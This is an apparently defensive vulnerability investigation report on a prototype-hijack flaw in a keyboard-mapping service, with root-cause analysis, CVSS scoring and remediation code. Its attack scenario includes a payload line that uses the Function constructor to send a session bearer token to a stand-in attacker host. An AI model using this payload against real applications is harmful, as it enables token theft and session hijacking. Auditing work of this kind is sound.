# VULN-002-I: Investigation Report - keyboard-dynamic-dispatch-prototype-hijack

**Phase**: Inquisitor
**Vulnerability ID**: VULN-002
**Descriptor**: keyboard-dynamic-dispatch-prototype-hijack
**Assessment**: 2026-07-31-10-57
**Investigated**: 2026-07-31T12:00:00Z
**Analyst**: D4rthB0b-Inquisitor
**Status**: CONFIRMED

---

## Investigation Summary

**Confirmation**: This vulnerability has been CONFIRMED as exploitable.
**Confirmed At**: 2026-07-31T12:00:00Z

**Exploitability**: HIGH

---

## Root Cause Analysis

[`KeyboardMappingService.checkKeyboardMappings()`](src/app/services/keyboard-mapping.service.ts:133) performs dynamic bracket-notation dispatch: `this.jsFunc[methodName](param)` where `methodName` is extracted from the `targetFunction` string. The only guard is `if(this.jsFunc[methodName])` — a truthiness check. JavaScript's prototype chain is fully accessible via bracket notation: `this.jsFunc['constructor']` returns the `Function` constructor, which is **truthy**. Therefore, a `targetFunction` of `'constructor(PAYLOAD)'` causes `this.jsFunc.constructor(PAYLOAD)()` — equivalent to `new Function(PAYLOAD)()` — arbitrary code execution. The `IJSFunctionService` interface is empty (no methods defined), meaning all bracket-notation access falls through to the prototype chain.

---

## Attack Scenario

**Attack Path 1 — Static Asset Tampering**:
1. Attacker modifies `KeyboardMappings.json` (no lock file → VULN-014, no artifact signing → VULN-018)
2. Sets `targetFunction = 'constructor(document.location="https://attacker.com/?t="+sessionStorage.getItem("gx_token"))'`
3. User presses the mapped key combination
4. `KeyboardMappingService` extracts `methodName='constructor'`, `param='document.location=...'`
5. `this.jsFunc['constructor']` is the `Function` constructor (truthy — check passes)
6. `this.jsFunc['constructor']('document.location=...')()` executes
7. Bearer token exfiltrated to attacker

**Attack Path 2 — ApplinX Server Compromise**:
Compromised ApplinX server returns malicious `keyboardMapping` in `CreateSessionResponse`. Same execution path.

---

## Prerequisites

- Attacker must modify `KeyboardMappings.json` (supply chain attack) OR compromise the ApplinX REST API server
- User must press the key combination mapped to the malicious `targetFunction`
- No allowlist of permitted method names in `JSFunctionsService` (confirmed — interface is empty)

---

## Privilege Boundary Analysis

**Starting Privilege**: Static asset modification capability (supply chain) or ApplinX server compromise
**Achieved Privilege**: Arbitrary JavaScript execution in authenticated user's browser — full DOM, sessionStorage, network access
**Boundary Crossed**: YES

---

## Impact Assessment

**Confidentiality**: HIGH
**Integrity**: HIGH
**Availability**: LOW

### Impact Description

Eval-equivalent RCE in browser context. Attacker can: exfiltrate Bearer token from `sessionStorage` (enabling full ApplinX session hijack), read all terminal screen content, capture credentials from DOM password fields, execute arbitrary ApplinX host commands. **Attack chain: VULN-002 → VULN-008 (token theft) → full host session takeover.** This is the highest-severity finding requiring immediate remediation.

---

## Data Flow Analysis

**Sources**:
- `KeyboardMappings.json` `targetFunction` string (static file, same-origin in production)
- ApplinX REST API `CreateSessionResponse.keyboardMapping` array (server-controlled)

**Transformations**:
- `targetFunction.indexOf('(')` extracts position of first `(`
- `keyFunc.substring(0, beginBracket)` → `methodName` (no validation)
- `if(this.jsFunc[methodName])` truthiness check — **does NOT block prototype chain** (`constructor` is truthy)
- `this.jsFunc[methodName](param)` — prototype chain traversal to `Function` constructor

**Sinks**:
- `this.jsFunc[methodName](param)` at [`keyboard-mapping.service.ts:140`](src/app/services/keyboard-mapping.service.ts:140) — arbitrary code execution
- `this.navigationService.sendKeys(keyFunc)` at line 145 — also exploitable (VULN-019)

---

## Affected Components

### Direct Impact

- **[`KeyboardMappingService.checkKeyboardMappings()`](src/app/services/keyboard-mapping.service.ts:133)**: Eval-equivalent code execution via prototype chain traversal
- **`IJSFunctionService`**: Empty interface — no allowlist defined; all method lookups fall through to prototype

### Indirect Impact

- **`StorageService` (sessionStorage `gx_token`)**: Bearer token exposed to arbitrary JS
- **`KeyboardMappings.json`**: Static asset attack vector — no integrity protection
- **VULN-014 (no lock file) + VULN-018 (no artifact signing)**: Supply chain enablers

---

## Classification Refinement

### Initial Classification (Scanner)
- CWE: CWE-913
- OWASP: A03:2021-Injection
- CVSS: 8.0 (HIGH)
- Vector: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N`

### Refined Classification (Inquisitor)
- CWE: CWE-913
- OWASP: A03:2021-Injection
- CVSS: **8.0 (HIGH)** (maintained — prototype hijack is confirmed eval-equivalent)
- Vector: `CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:L`

### Justification
- **Confirmed**: `this.jsFunc['constructor']` is the `Function` constructor — exploitable
- **PR updated to Low**: Requires controlling static asset or server (low privilege but not zero)
- **UI:R**: User must press the mapped key

---

## Remediation Guidance

### Recommended Fix

Add `Object.prototype.hasOwnProperty.call(this.jsFunc, methodName)` check AND an explicit allowlist:

```typescript
if (!Object.prototype.hasOwnProperty.call(this.jsFunc, methodName)) {
  this.logger.error('Blocked: method not on jsFunc own properties: ' + methodName);
  return;
}
```

**Priority**: IMMEDIATE

### Defense-in-Depth Recommendations

1. Add `hasOwnProperty` check to prevent prototype chain access
2. Define explicit method allowlist in `IJSFunctionService`
3. Validate `KeyboardMappings.json` `targetFunction` against strict regex (method name: `[a-zA-Z_][a-zA-Z0-9_]*`)
4. Enable artifact signing (VULN-018)
5. Commit `package-lock.json` (VULN-014)

---

## References

**Scan Finding**: [VULN-002-S-scan-finding.md](VULN-002-S-scan-finding.md)

**Threat Model References**:
- TM-003

**Attack Surface References**:
- AS-003, AS-004

---

**Investigation Complete**: 2026-07-31T12:00:00Z
**Next Phase**: Exploiter (PoC validation recommended) / Rectifier (IMMEDIATE fix)
**Registry**: [vulnerability-registry.md](../../vulnerability-registry.md)
